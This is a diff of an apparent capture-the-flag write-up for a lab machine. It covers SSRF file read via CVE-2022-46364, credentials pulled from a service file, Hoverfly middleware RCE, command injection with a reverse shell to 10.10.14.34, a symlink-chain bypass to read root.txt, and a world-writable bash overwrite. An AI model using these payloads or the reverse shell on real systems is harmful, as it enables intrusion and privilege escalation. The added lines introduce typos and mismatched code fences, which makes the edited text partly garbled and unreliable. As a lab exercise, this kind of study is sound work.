@@ -11,7 +11,7 @@ tags:  [ CVE-2022-46364, CVE-2025-54123, command injection, symlink abuse,]
 
 Start off with the nmap scan
 
-The scan shows ports 21, 22, 80, 8080, 8500, and 8888 open. Port 21 is FTP, on 80 there is a static site so not much there, ports 8080 and 8500 look like some proxy server, and on port 8888 is a Hoverfly dashboard which has a login page so we need creds for it.
+The scan shows ports 21 22 80 8080 8500 8888 open. Port 21 is ftp on 80 there is a static site so not much there ports 8080 8500 look like some proxy server and on port 8888 is a hoverfly dashboard which has a login page so we need creds for it.
 
 ```bash
 # Nmap 7.98 scan initiated Sat Mar 28 15:03:46 2026 as: /usr/lib/nmap/nmap -T4 -A -p- -o nmap.txt 10.129.21.201
@@ -153,7 +153,7 @@ ERROR - finished with errors, count: 10
 
 
 
-Looking through the decompiled code there is a SOAP web services app on port 8080 that uses Apache CXF with a vulnerable version to CVE-2022-46364. It's SSRF that will enable us file read on host with the privileges of the user running it and it's running as dev_ryan. Ask Claude to adjust the script from <https://github.com/kasem545/CVE-2022-46364-Poc> and it does. Replace TARGET_URL and DOMAIN.
+Looking through the decompiled there is a SOAP web services app on port 8080 that uses apache cfx with a vulnerable version to CVE-2022-46364. Its ssrf that will enable us file read on host with the priviliges of the user running it and it's running as dev_ryan. Ask claude ti adjust the script from <https://github.com/kasem545/CVE-2022-46364-Poc> and it does. Replace TARGET_URL and DOMAIN.
 
 ```bash
 #!/usr/bin/env python3
@@ -272,13 +272,13 @@ if __name__ == "__main__":
 
 
 
-Since we know that Hoverfly is running we can look for its service file **"/etc/systemd/system/hoverfly.service"** which might have some creds and it does.
+Since we know that hoverfly is running we can look for its service file **"/etc/systemd/system/hoverfly.service"** which might have some creds and it does.
 
 ![devarea01](/assets/img/posts/htb-devarea/devarea01.png)
 
 
 
-Hoverfly is v1.11.3 which is vulnerable to RCE. There is an official advisory with a PoC here <https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf> . So we construct the payload and get a shell.
+Hoverfly is v1.11.3 which is vulnerable to RCE. There is an official advisory with a poc here <https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf> . So we construct the payload and get a shell.
 
 ```bash
 PUT /api/v2/hoverfly/middleware HTTP/1.1
@@ -318,7 +318,7 @@ Now from here there are two ways to get the root.txt which I will explain next.
 
 **1.**
 
-There is a zipfile that looks like the backup of the syswatch app and looking through it we can find a command injection of the service on port 7777 that runs as syswatch user. 
+There is a zipfile that looks like the backup of the syswatch app and looking thorugh it we can find a command injection of the service on port 7777 that runs as syswatch user. 
 
 The Vulnerable Code
 ```python
@@ -338,7 +338,7 @@ def service_status():
 
 
 
-With `shell=True` and a single string, Python passes the entire thing to `/bin/sh -c "..."`. The shell then interprets special characters  `|`, `||`, `&&`, backticks, `$()`  as shell operators. The user input is no longer data; it becomes part of the command syntax. There is also the regex which can be bypassed especially since we know what is forbidden. The easiest way is to create a shell in tmp with the dev_ryan session and then execute it with the command injection as syswatch.
+With `shell=True` and a single string, Python passes the entire thing to `/bin/sh -c "..."`. The shell then interprets special characters — `|`, `||`, `&&`, backticks, `$()` — as shell operators. The user input is no longer data; it becomes part of the command syntax. There is also the regex which can be bypassed espcially since we know what is forbidden. The easiest way is to create a shell in tmp with the dev_ryan session and then execute it with the command injection as syswatch.
 
 So **echo '/bin/bash -i >& /dev/tcp/10.10.14.34/9001 0>&1' > /tmp/shell** and then execute:
 
@@ -396,7 +396,7 @@ view_logs() {
 
 The developer built what looks like a layered defence. Let's walk through each layer.
 
-**Layer 1  Block absolute paths:**
+**Layer 1 — Block absolute paths:**
 
 
 
@@ -407,9 +407,9 @@ if [[ "$target" == *"/"* || "$target" == *".."* ]]; then
 fi
 ```
 
-This blocks targets containing `/` or `..`  so you can't do `ln -s /root/root.txt r.log` directly. That symlink's target is `/root/root.txt`, which contains `/`, and gets caught here.
+This blocks targets containing `/` or `..` — so you can't do `ln -s /root/root.txt r.log` directly. That symlink's target is `/root/root.txt`, which contains `/`, and gets caught here.
 
-**Layer 2  Allow only safe-looking filenames:**
+**Layer 2 — Allow only safe-looking filenames:**
 
 
 
@@ -422,11 +422,11 @@ if [[ "$target" =~ ^[A-Za-z0-9_.-]+$ ]]; then
 fi
 ```
 
-If the target looks like a plain filename,  only alphanumeric, dots, dashes, underscores,  treat it as safe. Resolve it back into the log directory and read it.
+If the target looks like a plain filename — only alphanumeric, dots, dashes, underscores — treat it as safe. Resolve it back into the log directory and read it.
 
 The developer's mental model here is: *a relative filename with no slashes or dotdot must stay inside the log directory.* That reasoning is correct for one hop. The mistake is assuming `cat "$resolved"` operates at the same level of abstraction as the validation.
 
-**Layer 3  Allow `/var/log/` explicitly:**
+**Layer 3 — Allow `/var/log/` explicitly:**
 
 ```bash
 if [[ "$target" == /var/log/* ]]; then
@@ -434,7 +434,7 @@ if [[ "$target" == /var/log/* ]]; then
 fi
 ```
 
-An intentional escape hatch,  symlinks into `/var/log/` are permitted because `log_monitor.sh` legitimately monitors those files. This would have been another attack path if `syswatch` could write to `/var/log/`.
+An intentional escape hatch — symlinks into `/var/log/` are permitted because `log_monitor.sh` legitimately monitors those files. This would have been another attack path if `syswatch` could write to `/var/log/`.
 
 
 
@@ -442,23 +442,22 @@ An intentional escape hatch,  symlinks into `/var/log/` are permitted because `l
 
 The validation inspects **one level** of indirection:
 
-```bash
+~~~bash
 target=$(ls -l "$path" | awk '{print $NF}')
 # target = "root.txt" -- looks safe, passes regex
 ```
 
 But `cat "$resolved"` asks the **kernel** to resolve the path, and the kernel follows **every** symlink in the chain without limit (up to `MAXSYMLINKS`, typically 40).
-
 ```
 view_logs inspects:    r.log -> root.txt         ← validation happens here
 kernel resolves:       r.log -> root.txt -> /root/root.txt  ← read happens here
-```
+~~~
 
-The validation and the file access operate at different levels. The code trusts that `$LOG_DIR/root.txt` is a regular file because it passed `[ -f ]`  but `[ -f ]` itself follows symlinks. It returns true if the **final resolved target** is a regular file, regardless of how many hops it took.
+The validation and the file access operate at different levels. The code trusts that `$LOG_DIR/root.txt` is a regular file because it passed `[ -f ]` — but `[ -f ]` itself follows symlinks. It returns true if the **final resolved target** is a regular file, regardless of how many hops it took.
 
 ------
 
- 
+### 
 
 **The Exploit Chain Step by Step**
 
@@ -508,7 +507,7 @@ dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh logs r.log
 
 **2.**
 
-The /bin/bash is world writeable so just switch the shell to sh/dash, kill all the bash processes running because otherwise we can't overwrite it, then make a malicious bash and execute it to get the shell.
+The /bin/bash is world writeable so just switch the shell to sh/dash kill all the bash processes running because otherwise we can't overwrite it then make a malicious bash and execute the get the shell.
 
 
 
